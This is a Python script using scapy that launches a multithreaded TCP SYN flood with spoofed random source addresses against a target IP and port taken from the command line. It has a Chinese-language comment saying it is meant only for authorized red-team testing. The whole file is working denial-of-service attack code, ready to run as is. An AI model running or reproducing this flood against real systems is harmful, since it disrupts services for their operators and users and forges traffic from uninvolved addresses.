from scapy.all import *
import random
import time
from threading import Thread

# 警告：此腳本僅供紅隊測試與安全研究使用，嚴禁未經授權的攻擊行為。
target_ip = "192.168.1.100"  # 換成你想測試的目標IP
target_port = 80
threads = 500

def syn_flood():
    while True:
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        src_port = random.randint(1024, 65535)
        ip_packet = IP(src=src_ip, dst=target_ip)
        tcp_packet = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9999))
        send(ip_packet/tcp_packet, verbose=False)

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
    if len(sys.argv) > 2:
        target_port = int(sys.argv[2])
    
    print(f"[*] Starting SYN Flood on {target_ip}:{target_port} with {threads} threads...")
    for i in range(threads):
        Thread(target=syn_flood).start()
